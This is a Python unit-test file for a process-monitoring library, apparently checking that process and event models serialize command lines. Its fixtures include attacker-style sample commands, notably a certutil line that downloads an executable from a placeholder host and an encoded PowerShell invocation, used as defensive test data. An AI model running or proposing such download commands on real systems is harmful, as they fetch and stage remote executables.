"""Unit tests for process model serialization (including command_line)."""

import unittest

from process_monitor.models import EventType, ProcessEvent, ProcessInfo, ProcessSnapshot


class ProcessInfoTests(unittest.TestCase):
    def test_to_dict_includes_command_line(self):
        info = ProcessInfo(
            pid=1234,
            name="powershell.exe",
            executable_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell.exe -EncodedCommand AAAA",
            parent_pid=5678,
            parent_name="explorer.exe",
        )
        d = info.to_dict()
        self.assertEqual(d["pid"], 1234)
        self.assertEqual(d["name"], "powershell.exe")
        self.assertEqual(d["command_line"], "powershell.exe -EncodedCommand AAAA")
        self.assertNotIn("cpu_percent", d)
        self.assertNotIn("access_error", d)

    def test_to_dict_omits_none_command_line(self):
        info = ProcessInfo(pid=1, name="System")
        d = info.to_dict()
        self.assertNotIn("command_line", d)


class ProcessEventTests(unittest.TestCase):
    def test_to_dict_includes_command_line(self):
        evt = ProcessEvent(
            event_type=EventType.PROCESS_STARTED,
            pid=42,
            process_name="cmd.exe",
            command_line=r'C:\Windows\System32\cmd.exe /c certutil -urlcache -f http://x/y.exe',
        )
        d = evt.to_dict()
        self.assertEqual(
            d["command_line"],
            r'C:\Windows\System32\cmd.exe /c certutil -urlcache -f http://x/y.exe',
        )
        self.assertEqual(d["event_type"], "PROCESS_STARTED")

    def test_from_process_info_carries_command_line(self):
        info = ProcessInfo(pid=9, name="wscript.exe", command_line="wscript.exe cheese.vbs")
        evt = ProcessEvent.from_process_info(info, EventType.PROCESS_STARTED)
        self.assertEqual(evt.command_line, "wscript.exe cheese.vbs")
        self.assertNotIn("command_line", evt.metadata)
        d = evt.to_dict()
        self.assertEqual(d["command_line"], "wscript.exe cheese.vbs")

    def test_snapshot_serialization_includes_command_line(self):
        snap = ProcessSnapshot(
            processes=[
                ProcessInfo(pid=1, name="System"),
                ProcessInfo(pid=2, name="svchost.exe", command_line="svchost.exe -k netsvcs"),
            ]
        )
        d = snap.to_dict()
        self.assertEqual(d["total_count"], 2)
        self.assertEqual(d["processes"][1]["command_line"], "svchost.exe -k netsvcs")
        self.assertEqual(d["processes"][0]["name"], "System")


if __name__ == "__main__":
    unittest.main()